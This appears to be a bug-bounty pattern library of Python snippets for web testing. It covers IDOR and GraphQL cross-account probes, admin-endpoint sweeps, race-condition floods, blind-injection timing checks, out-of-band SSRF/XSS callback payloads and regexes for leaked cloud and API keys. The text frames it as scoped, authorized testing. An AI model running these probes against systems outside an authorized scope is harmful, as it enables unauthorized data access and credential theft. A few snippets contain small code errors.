# Pattern Library — copy-paste custom scanner patterns

Battle-tested snippets for the cases that justify a custom script. Each pattern
is a *logic* block — wrap it in the async engine from
`custom-scanner-kit/SKILL.md §3` and add your scope gate + redaction.

All request helpers assume `httpx.AsyncClient` named `client`, `Scanner` with
`fetch_with_retry()`, and `bb_common` utils imported. Mind the safety rails:
scope every target, proxy through Caido, redact every token.

---

## 1. IDOR — cross-account object access (the classic)

One **victim** token (owns objects) and one **attacker** token (should NOT).
For each object id + query, call with both; flag when attacker gets real data.

```python
# 30 smart probe IDs per parameter (adjacent / enum / high-value / random)
import uuid, random
def probe_ids(base: object) -> list:
    ids = []
    if isinstance(base, int):
        for d in (-1, 0, 1, 2, 10, 100, 1000, -2): ids.append(base + d)
        ids += [1, 2, 3, 100, 999, 1001, 100000]
    else:  # uuid
        ids.append("00000000-0000-0000-0000-000000000000")
        ids.append(str(uuid.UUID(int=random.getrandbits(128))))
    ids.append("-1"); ids.append("0"); ids.append("null")
    return list(dict.fromkeys(ids))

def is_real_data(resp_body: dict) -> bool:
    d = resp_body.get("data")
    if not d: return False
    for k, v in d.items():                  # flatten one level
        if v not in (None, {}, []): return True
    return False

async def idor(client, url_tmpl, token_a, token_b):
    for pid in probe_ids(BASE_ID):
        r_a = await client.get(url_tmpl.format(pid), headers=token_a)
        r_b = await client.get(url_tmpl.format(pid), headers=token_b)
        a, b = r_a.json(), r_b.json()
        same = is_real_data(a) and is_real_data(b)
        no_err = not b.get("errors")
        # B got real data that isn't an auth error => IDOR
        if is_real_data(b) and no_err and (not is_real_data(a) or same):
            yield {"id": pid, "sev": "HIGH", "resp_b": redact(json.dumps(b)[:400])}
```

**Diff axes** for stronger proof: status code, response size, **structural
fingerprint** (hash of tag-sorted body), and sensitive-field presence. Require
≥2 changed axes + a semantic marker before "confirmed" to kill false positives.

---

## 2. Auth bypass — sibling endpoint sweep (BFLA)

Given an authenticated main path, test the **siblings** a developer forgot to
guard. Low-priv token + method swap + old version.

```python
ENDPOINTS = ["/api/user", "/api/admin/users", "/v1/admin", "/api/v2/users",
             "/internal", "/backoffice", "/graphql", "/actuator"]
METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE"]

async def bfla_sweep(client, base, token_low):
    for ep in ENDPOINTS:
        for m in METHODS:
            r = await client.request(m, base + ep, headers=token_low)
            if r.status_code == 200 and m != "GET":
                yield f"{m} {ep} -> 200 (unauth'd mutation!)"
            elif r.status_code in (200, 201) and "admin" in ep:
                yield f"GET {ep} -> {r.status_code} (sibling reached with low priv)"
```

**Signal:** any endpoint that a lower-privilege token can mutate/read is a
finding. Old-API-version probing (`/v1`, `/v2`, `/internal/`) is high-yield.

---

## 3. GraphQL — introspection off, IDOR, mutation authz

When introspection is disabled, **guess** common queries/fields; test
`node(id:)` for IDOR; verify every mutation is authz'd.

```python
QUERIES = ["{ __typename }",
           "{ user(id: \"1\") { id email } }",
           "{ viewer { id email } }",
           "query { node(id: \"%s\") { ... on User { id email } } }"]

async def graphql_idor(client, gql_url, token_a, token_b, node_ids):
    for nid in node_ids:
        q = node_query % nid
        r_a = (await client.post(gql_url, json={"query": q}, headers=token_a)).json()
        r_b = (await client.post(gql_url, json={"query": q}, headers=token_b)).json()
        if is_real_data(r_b) and not r_b.get("errors"):
            yield nid  # cross-user access via node()
```

**Mutation authz:** replay each mutation with the attacker token; if it succeeds
(data returned) without an auth/permission error → CRITICAL privilege escalation.

---

## 4. Race conditions — parallel TOCTOU / limit overrun

Fire N identical mutating requests **simultaneously** and diff the outcomes.

```python
async def race(client, url, headers, payloads, simultaneous=8):
    async def one(p):
        return await client.post(url, json=p, headers=headers)
    tasks = [one(p) for p in payloads for _ in range(simultaneous)]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    statuses = [r.status_code for r in results if not isinstance(r, Exception)]
    ok = statuses.count(200)      # how many succeeded — should be <= expected
    if ok > EXPECTED:             # e.g. coupon applied more than once
        yield {"opened": ok, "window": "race detected"}
```

Blind-ish races (e.g. referral credit, double-spend) need an OOB or a state-probe
afterwards — wait, then re-GET the resource to see how many wins landed.

---

## 5. Response signalling — adaptive timing + error regex

Timing anomalies (blind SQLi / SSTI / RCE) need **outlier detection**, not a fixed
threshold. Use MAD/IQR; compute the outlier bound from a control set.

```python
import statistics
def outlier_bound(times: list[float], k=4.0):
    med = statistics.median(times)
    mad = statistics.median([abs(t - med) for t in times]) or 0.001
    return med + k * 1.4826 * mad      # robust z-score boundary

# control = N baseline timings; injected timing above bound => a signal
```

**Error-regex** per framework to detect leakage in responses (and to *exclude*
benign matches): stack traces, SQL errors, Django/Jinja/Spring markers, null
bytes. Compile once, reuse.

---

## 6. OOB / blind — interactsh callbacks

For blind SSRF/XSS/SQLi/RCE/SSTI, embed a unique interactsh payload per probe and
watch for the callback.

```python
# unique token per request so you can correlate the hit to the exact input
import uuid
def oob_payload(collab_host, tag):
    uid = uuid.uuid4().hex[:8]
    return f"http://{tag}-{uid}.{collab_host}/", uid

# blind SSRF: {"url": oob_host}; blind XSS: <img src=oob_host>
# then check interactsh/your OOB server for hits keyed by uid
```

Use a fresh callback suffix per request for precision.

---

## 7. Secret / credential hunting (JS + API responses)

Compiled regex sweep for high-signal keys in crawled JS and API bodies.

```python
import re
PATTERNS = {
  "AWS":      re.compile(r"AKIA[0-9A-Z]{16}"),
  "GITHUB":   re.compile(r"ghp_[A-Za-z0-9]{20,}"),
  "JWT":      re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,}"),
  "STRIPE":   re.compile(r"sk_live_[A-Za-z0-9]{20,}"),
  "FLAG":     re.compile(r"(?i)(flag|ctf|secret)\{[^}]{5,}\}"),
  "TOKEN":    re.compile(r"(?i)(api[_-]?key|secret|token|bearer)\s*[:=]\s*[\"']?([A-Za-z0-9_\-]{16,})"),
}
```

Compile once, scan many files. When found, **redact on output** and pass to
`client-reverse` / validation — a leaked key only counts if it's *usable*.

---

## 8. Fuzzing beyond a static wordlist

`ffuf` wins on raw wordlists. Write custom code when the fuzzing is
**value/state-aware** (needs auth, needs a valid parent id, needs a prior
response to build the next input — e.g. nested resource enumeration,
workflow-skip, negative-quantity).

```python
async def chained_enum(client, base, token, parent_ids):
    for pid in parent_ids:
        # fetch children of pid, then recurse — the "logic" is the link
        kids = (await client.get(f"{base}/parents/{pid}/children", headers=token)).json()
        for c in kids:
            yield {"parent": pid, "child": c}
```

---

## Putting it together

- Every block returns a small `yield`/accumulator of findings with a severity +
  a **redacted** evidence snippet.
- Feed results into `triage-validation` (7-Question Gate) before reporting.
- Route the whole scan through Caido; scope-gate every new target host.
